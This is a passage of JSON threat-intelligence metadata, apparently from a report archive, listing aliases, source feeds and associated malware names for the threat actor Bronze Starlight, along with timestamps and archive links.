            "updated_at": "2025-03-27T02:02:09.793332Z",
            "deleted_at": null,
            "main_name": "Bronze Starlight",
            "aliases": [
                "Cinnamon Tempest",
                "DEV-0401",
                "Operation ChattyGoblin",
                "SLIME34"
            ],
            "source_name": "ETDA:Bronze Starlight",
            "tools": [
                "Agent.dhwf",
                "Agentemis",
                "AtomSilo",
                "Cobalt Strike",
                "CobaltStrike",
                "Destroy RAT",
                "DestroyRAT",
                "HUI Loader",
                "Kaba",
                "Korplug",
                "LockFile",
                "Night Sky",
                "NightSky",
                "Pandora",
                "PlugX",
                "RedDelta",
                "Sogu",
                "TIGERPLUG",
                "TVT",
                "Thoper",
                "Xamtrav",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "c69bcda3-0893-4ea1-9ec1-ae016332d283",
            "created_at": "2023-01-06T13:46:39.410593Z",
            "updated_at": "2025-03-27T02:00:03.081388Z",
            "deleted_at": null,
            "main_name": "BRONZE STARLIGHT",
            "aliases": [
                "DEV-0401",
                "Cinnamon Tempest",
                "Emperor Dragonfly",
                "SLIME34"
            ],
            "source_name": "MISPGALAXY:BRONZE STARLIGHT",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673535780,
    "ts_updated_at": 1743041821,
    "ts_creation_date": 1653780063,
    "ts_modification_date": 1653780063,
    "files": {
        "pdf": "https://archive.orkl.eu/434bafb13939fd216b92c8e7c67539e3f9caac7f.pdf",
        "text": "https://archive.orkl.eu/434bafb13939fd216b92c8e7c67539e3f9caac7f.txt",
        "img": "https://archive.orkl.eu/434bafb13939fd216b92c8e7c67539e3f9caac7f.jpg"
    }
}